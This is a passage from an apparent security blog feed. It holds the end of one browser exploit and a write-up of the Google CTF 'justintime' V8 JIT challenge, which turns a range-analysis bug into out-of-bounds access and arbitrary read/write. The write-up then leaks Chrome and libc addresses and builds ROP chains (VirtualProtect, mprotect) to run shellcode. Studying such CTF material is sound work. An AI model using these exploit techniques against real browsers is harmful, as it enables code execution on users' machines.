Int64.fromDouble(sc_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">scratch_u8.set(shellcode, <span class="built_in">Number</span>(sc_offset));</span></span><br><span class="line"></span><br><span class="line">scratch_u64.fill(gadget, 0, 100);</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> fake_vtab = scratch_addr;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the fake_vtab is at " + Int64.fromDouble(fake_vtab).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> fake_stack = scratch_addr + <span class="keyword">new</span> Int64(<span class="number">0x10000</span>).asDouble();</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> stack = [</span></span><br><span class="line">    pop_rcx_ret,</span><br><span class="line">    sc_addr,</span><br><span class="line">    pop_rdx_ret,</span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Int64(<span class="number">0x1000</span>).asDouble(),</span></span><br><span class="line">    pop_r8_ret,</span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Int64(<span class="number">0x40</span>).asDouble(),</span></span><br><span class="line">    pop_r9_ret,</span><br><span class="line">    scratch_addr,</span><br><span class="line"><span class="actionscript">    virtaulprotect_addr, <span class="comment">// VirtualProtect</span></span></span><br><span class="line">    sc_addr,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; stack.length; ++i) &#123;</span></span><br><span class="line">    scratch_u64[0x10000/8 + i] = stack[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x10</span>).asDouble(), fake_stack); <span class="comment">// RSP</span></span></span><br><span class="line"><span class="actionscript">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x50</span>).asDouble(), pop_rcx_ret + <span class="keyword">new</span> Int64(<span class="number">0x1</span>).asDouble()); <span class="comment">// RIP = ret</span></span></span><br><span class="line"><span class="actionscript">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x58</span>).asDouble(), <span class="number">0</span>);</span></span><br><span class="line"><span class="actionscript">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x60</span>).asDouble(), <span class="number">0</span>);</span></span><br><span class="line"><span class="actionscript">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x68</span>).asDouble(), <span class="number">0</span>);</span></span><br><span class="line">writePtr(offset, el_addr, fake_vtab);</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("ok");</span></span></span><br><span class="line"><span class="actionscript">div.dispatchEvent(<span class="keyword">new</span> Event(<span class="string">'click'</span>));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; title=&quot;参考链接&quot;&gt;&lt;/a&gt;参考链接&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/det
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Google CTF justintime exploit</title>
    <link href="http://eternalsakura13.com/2018/11/19/justintime/"/>
    <id>http://eternalsakura13.com/2018/11/19/justintime/</id>
    <published>2018-11-19T03:53:18.816Z</published>
    <updated>2018-11-19T11:40:57.566Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/google/google-ctf/tree/master/2018/finals/pwn-just-in-time/" target="_blank" rel="noopener">https://github.com/google/google-ctf/tree/master/2018/finals/pwn-just-in-time/</a><br>Thanks for Stephen, I learned a lot from his amazing challenge.</p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><p>I am lazy, so I use Xcode to compile V8 version 7.2.0 (candidate)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/v8/v8</span><br><span class="line">git reset 7.2.0 --hard</span><br><span class="line">gclient sync</span><br><span class="line">gn gen out/gn --ide=<span class="string">"xcode"</span></span><br><span class="line">patch -p1 &lt; ./addition-reducer.patch</span><br><span class="line"><span class="built_in">cd</span> out/gn</span><br><span class="line">open all.xcworkspace/</span><br><span class="line">Compile</span><br></pre></td></tr></table></figure><h2 id="Some-features"><a href="#Some-features" class="headerlink" title="Some features"></a>Some features</h2><h3 id="Max-Safe-Integer-Range-of-Doubles"><a href="#Max-Safe-Integer-Range-of-Doubles" class="headerlink" title="Max Safe Integer Range of Doubles"></a>Max Safe Integer Range of Doubles</h3><p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>.MAX_SAFE_INTEGER = <span class="number">2</span>^<span class="number">53</span> - <span class="number">1</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">var</span> x = <span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span>;<span class="comment">//x = 9007199254740992</span></span><br><span class="line">x += <span class="number">1</span>;<span class="comment">//x = 9007199254740992</span></span><br><span class="line">x += <span class="number">1</span>;<span class="comment">//x = 9007199254740992</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> y = <span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span>;<span class="comment">//y = 9007199254740992</span></span><br><span class="line">y += <span class="number">2</span>;<span class="comment">//y = 9007199254740994</span></span><br></pre></td></tr></table></figure><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">doit</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">    <span class="keyword">let</span> x = doit ? <span class="number">9007199254740992</span> : <span class="number">9007199254740991</span><span class="number">-2</span>;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// #29:NumberConstant[1]()  [Type: Range(1, 1)]</span></span><br><span class="line">    <span class="comment">// #30:SpeculativeNumberAdd[Number](#25:Phi, #29:NumberConstant, #26:Checkpoint, #23:Merge)  [Type: Range(9007199254740990, 9007199254740992)]</span></span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// #29:NumberConstant[1]()  [Type: Range(1, 1)]</span></span><br><span class="line">    <span class="comment">// #31:SpeculativeNumberAdd[Number](#30:SpeculativeNumberAdd, #29:NumberConstant, #30:SpeculativeNumberAdd, #23:Merge)  [Type: Range(9007199254740991, 9007199254740992)]</span></span><br><span class="line">    x -= <span class="number">9007199254740991</span>;<span class="comment">//解释:range(0,1);编译:(0,3);</span></span><br><span class="line">    <span class="comment">// #32:NumberConstant[9.0072e+15]()  [Type: Range(9007199254740991, 9007199254740991)]</span></span><br><span class="line">    <span class="comment">// #33:SpeculativeNumberSubtract[Number](#31:SpeculativeNumberAdd, #32:NumberConstant, #31:SpeculativeNumberAdd, #23:Merge)  [Type: Range(0, 1)]</span></span><br><span class="line">    x *= <span class="number">3</span>;<span class="comment">//解释:(0,3);编译:(0,9);</span></span><br><span class="line">    <span class="comment">// #34:NumberConstant[3]()  [Type: Range(3, 3)]</span></span><br><span class="line">    <span class="comment">// #35:SpeculativeNumberMultiply[Number](#33:SpeculativeNumberSubtract, #34:NumberConstant, #33:SpeculativeNumberSubtract, #23:Merge)  [Type: Range(0, 3)]</span></span><br><span class="line">    x += <span class="number">2</span>;<span class="comment">//解释:(2,5);编译:(2,11);</span></span><br><span class="line">    <span class="comment">// #36:NumberConstant[2]()  [Type: Range(2, 2)]</span></span><br><span class="line">    <span class="comment">// #37:SpeculativeNumberAdd[Number](#35:SpeculativeNumberMultiply, #36:NumberConstant, #35:SpeculativeNumberMultiply, #23:Merge)  [Type: Range(2, 5)]</span></span><br><span class="line">    a[x] = <span class="number">2.1729236899484e-311</span>; <span class="comment">// (1024).smi2f()</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)&#123;</span><br><span class="line">  foo(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Run PoC until <code>remove checkbounds</code> is called:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">index_type.Print();</span><br><span class="line">-&gt;Range(<span class="number">2</span>, <span class="number">5</span>)</span><br><span class="line">length_type.Print();</span><br><span class="line">-&gt;Range(<span class="number">6</span>, <span class="number">6</span>)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">                (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                 index_type.Max() &lt; length_type.Min())) </span><br><span class="line">Condition is satisfied，so it removes CheckBounds</span><br></pre></td></tr></table></figure><p>All in all, the result of <code>range analyzes</code> is different from the result of <code>optimized range</code>. After <code>simplified lower</code> removes boundary check, we can do OOB read/write.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Partial-OOB-read-write"><a href="#Partial-OOB-read-write" class="headerlink" title="Partial OOB read/write"></a>Partial OOB read/write</h3><p>We place <code>array a</code> next to <code>array b</code>, use OOB write from <code>a</code> to change the length of <code>array b</code>. Now, the length of <code>b</code> is <code>0x400</code>.</p><p>And we can OOB via <code>array b</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">doit</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">  <span class="keyword">let</span> b = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;<span class="comment">//-&gt;trigger JIT</span></span><br><span class="line">    foo(<span class="literal">true</span>);</span><br><span class="line">    g2[<span class="number">100</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (g2[<span class="number">12</span>] != <span class="literal">undefined</span>) <span class="keyword">break</span>;<span class="comment">//-&gt;Confirm the boundary is overwritten </span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (g2[<span class="number">12</span>] == <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">'g2[12] == undefined'</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-114549.png" alt=""></p><h3 id="From-Partial-OOB-R-W-to-Arbitrary-R-W-Primitive"><a href="#From-Partial-OOB-R-W-to-Arbitrary-R-W-Primitive" class="headerlink" title="From Partial OOB R/W to Arbitrary R/W Primitive"></a>From Partial OOB R/W to Arbitrary R/W Primitive</h3><p>Add a <code>Float64Array</code>. We can <strong>edit</strong> the <code>backing store</code> of <code>ArrayBuffer</code> to arbitrary R/W primitive.</p><p>We won’t create Float64Array unless the memory is in <code>g2[ab_off]</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">doit</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">let</span> b = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">  ...</span><br><span class="line">  g2 = b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ab_off = <span class="number">26</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  g4 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">7</span>);<span class="comment">//set up a Float64Array</span></span><br><span class="line">  <span class="keyword">if</span> (g2[ab_off+<span class="number">5</span>].f2smi() != <span class="number">0x38n</span> || g2[ab_off+<span class="number">6</span>].f2smi() != <span class="number">0x7n</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">'array buffer not at expected location'</span>;</span><br><span class="line">    <span class="comment">//byte_length is 0x38, length is 0x7</span></span><br><span class="line">    <span class="comment">//so, Float64Array is in correct location now</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-114922.png" alt=""></p><p>Find the address of array buffer backing store:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ab_backing_store_off = ab_off + <span class="number">0x15</span>;</span><br><span class="line">...</span><br><span class="line">g4[<span class="number">0</span>] = <span class="number">5.5</span>;</span><br><span class="line"><span class="keyword">if</span> (g2[ab_backing_store_off] != g4[<span class="number">0</span>]) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="string">'array buffer backing store not at expected location'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I wonder which address records the backing store. After checking for a little while, it’s my first time to see <strong>new Float64Array() directly</strong>. Normally, it should be：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">20</span>);</span><br><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(ab);</span><br></pre></td></tr></table></figure><p>Finding the elements of <code>Float64Array</code>.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113544.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113454.png" alt=""></p><p>Add <code>+0x10</code> to the address, we can get <code>backing store</code>.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-115204.png" alt=""></p><p>The address of elements is <code>0x0000093f18ac9ed</code>. In <code>0x0000093f18ac9ed+0x20</code>, we have the first element <code>-5.5</code>.(<code>0x4016000000000000</code> in the picture):<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113654.png" alt=""></p><p>When we edit backing store to get arbitrary r/w primitive, assume <code>addr</code> as the target address, change the value of backing store to <code>addr-0x20</code>，then we can leak content in this address.</p><h3 id="User-mode-object-leak-primitive"><a href="#User-mode-object-leak-primitive" class="headerlink" title="User mode object leak primitive"></a>User mode object leak primitive</h3><p>Appending an object to <code>g3</code>. Then, double array <code>g2</code> can leak that object, resulting type confusion. The leaked content is <code>float</code>. <code>f2i</code> is able to convert it to integer:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak_ptr</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">  g3[<span class="number">0</span>] = o;</span><br><span class="line">  <span class="keyword">let</span> ptr = g2[g3_off];</span><br><span class="line">  g3[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> ptr.f2i();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Here is the output：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Array_addr = leak_ptr(<span class="built_in">Array</span>);</span><br><span class="line">print(<span class="string">'Array_addr: '</span> + Array_addr.hex());</span><br><span class="line">...</span><br><span class="line">Array_addr: <span class="number">0x93f11611259</span></span><br></pre></td></tr></table></figure><h3 id="Arbitrary-Address-R-W-Primitive"><a href="#Arbitrary-Address-R-W-Primitive" class="headerlink" title="Arbitrary Address R/W Primitive"></a>Arbitrary Address R/W Primitive</h3><p>Script:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readq</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> old = g2[ab_off+<span class="number">2</span>];</span><br><span class="line">  g2[ab_backing_store_off<span class="number">-2</span>] = (addr<span class="number">-0x20n</span>|<span class="number">1n</span>).i2f();</span><br><span class="line">  <span class="keyword">let</span> q = g4[<span class="number">0</span>];</span><br><span class="line">  g2[ab_off+<span class="number">2</span>] = old;</span><br><span class="line">  <span class="keyword">return</span> q.f2i();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeq</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> old = g2[ab_off+<span class="number">2</span>];</span><br><span class="line">  g2[ab_backing_store_off<span class="number">-2</span>] = (addr<span class="number">-0x20n</span>|<span class="number">1n</span>).i2f();</span><br><span class="line">  g4[<span class="number">0</span>] = val.i2f();</span><br><span class="line">  g2[ab_off+<span class="number">2</span>] = old;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let’s have a look on <code>readq</code></p><p>We can get the original value of <code>backing store</code> form <code>g2[ab_off+2]</code>. Change it to the target address. Pay attention to the last <code>1</code>. This is a mechanism called <code>Tagged Value</code>. Only when 1 is in the last of the address can it be a valid pointer of <code>HeapObject</code>.</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113544.png" alt=""></p><p>Edit it to the content we want to read. E.g, leak the code:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-120746.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-120730.png" alt=""></p><p>I explained why we should <code>- 20</code> previously, so skip this part here:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g2[ab_backing_store_off<span class="number">-2</span>] = (addr<span class="number">-0x20n</span>|<span class="number">1n</span>).i2f();</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-121339.png" alt=""></p><p>Now the <code>backing store</code> is changed to <code>addr-0x20</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-121639.png" alt=""></p><p>We can leak code address <code>0x000001db14a8c821</code> from <code>0x0000093f11611288</code> now.</p><p>Output:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Array_addr = leak_ptr(<span class="built_in">Array</span>);</span><br><span class="line">print(<span class="string">'Array_addr: '</span> + Array_addr.hex());</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> Array_code_addr = readq(Array_addr + <span class="number">6n</span>*<span class="number">8n</span>);</span><br><span class="line">print(<span class="string">'Array_code_addr: '</span> + Array_code_addr.hex());</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Array_code_addr: <span class="number">0x1db14a8c821</span></span><br></pre></td></tr></table></figure><p><code>writeq</code> is the same as <code>readq</code>.</p><h3 id="Security-Feature"><a href="#Security-Feature" class="headerlink" title="Security Feature"></a>Security Feature</h3><p>Earlier than <code>version 6.7</code>, the function code is writable. Therefore, we can write shellcode to functions and call the function to execute.</p><p>Later, however, the code is not writable and we need to chain ROP.(<a href="https://github.com/v8/v8/commit/f7aa8ea00bbf200e9050a22ec84fab4f323849a7" target="_blank" rel="noopener">https://github.com/v8/v8/commit/f7aa8ea00bbf200e9050a22ec84fab4f323849a7</a>)</p><h3 id="leak-ArrayConstructor"><a href="#leak-ArrayConstructor" class="headerlink" title="leak ArrayConstructor"></a>leak ArrayConstructor</h3><p>Now, leak the address of <code>Array</code>, Then find the address of Array’s code. In the final, calculate the address of ArrayConstructor:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Array_addr = leak_ptr(<span class="built_in">Array</span>);</span><br><span class="line">print(<span class="string">'Array_addr: '</span> + Array_addr.hex());</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> Array_code_addr = readq(Array_addr + <span class="number">6n</span>*<span class="number">8n</span>);</span><br><span class="line">print(<span class="string">'Array_code_addr: '</span> + Array_code_addr.hex());</span><br><span class="line"><span class="comment">// Builtins_ArrayConstructor</span></span><br><span class="line"><span class="keyword">let</span> builtin_val = readq(Array_code_addr+<span class="number">8n</span>*<span class="number">8n</span>);</span><br><span class="line"><span class="keyword">let</span> Array_builtin_addr = builtin_val &gt;&gt; <span class="number">16n</span>;</span><br><span class="line">print(<span class="string">'Array_builtin_addr: '</span> + Array_builtin_addr.hex());</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-122341.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-122454.png" alt=""></p><h3 id="Reverse-Chrome-and-libc"><a href="#Reverse-Chrome-and-libc" class="headerlink" title="Reverse Chrome and libc"></a>Reverse Chrome and libc</h3><p>We can leak the address of <code>ArrayConstructor</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085233.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085258.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085307.jpg" alt=""></p><p>It’s mapped to the memory of chrome binary.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085402.png" alt=""></p><p>Use IDA to reverse. Seek the offset of <code>ArrayConstructor</code> in chrome binary.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0x55b677f727c0-0x55b673f16000)</span><br><span class="line">&#39;0x405c7c0&#39;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085706.png" alt=""></p><p><code>chrome binary base address</code>=<code>ArrayConstructor</code>-<code>0x405c7c0</code>. Let’s store the result in <code>bin_base</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> bin_base = Array_builtin_addr - <span class="number">0x405c7c0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`bin base: <span class="subst">$&#123;bin_base.hex()&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><p>Find <code>got table</code>. <code>cxa_finalize</code> is a libc function，there is a <code>got</code> in chrome pointing to it, the offset to the pointer is <code>0x8DDBDE8</code>.</p><p>Then leak <code>cxa_finalize</code>:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085836.png" alt=""></p><p>Reverse the libc.so, use <code>cxa_finalize_got</code>-<code>0x43520</code> to get the <code>base address</code> of libc:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090345.png" alt=""></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> cxa_finalize_got = bin_base + <span class="number">0x8ddbde8n</span>;</span><br><span class="line"><span class="keyword">let</span> libc_base = readq(cxa_finalize_got) - <span class="number">0x43520n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'libc base: '</span> + libc_base.hex());</span><br></pre></td></tr></table></figure><p>Find <code>environ</code> to leak stack address:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090537.png" alt=""></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> environ = libc_base+<span class="number">0x3ee098n</span>;</span><br><span class="line"><span class="keyword">let</span> stack_ptr = readq(environ);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`stack: <span class="subst">$&#123;stack_ptr.hex()&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090700.jpg" alt=""></p><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>This section is easy, we use <code>mprotect</code> to change the permission of memory and execute shellcode:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">let</span> nop = bin_base+<span class="number">0x263d061n</span>;</span><br><span class="line">  <span class="keyword">let</span> pop_rdi = bin_base+<span class="number">0x264bdccn</span>;</span><br><span class="line">  <span class="keyword">let</span> 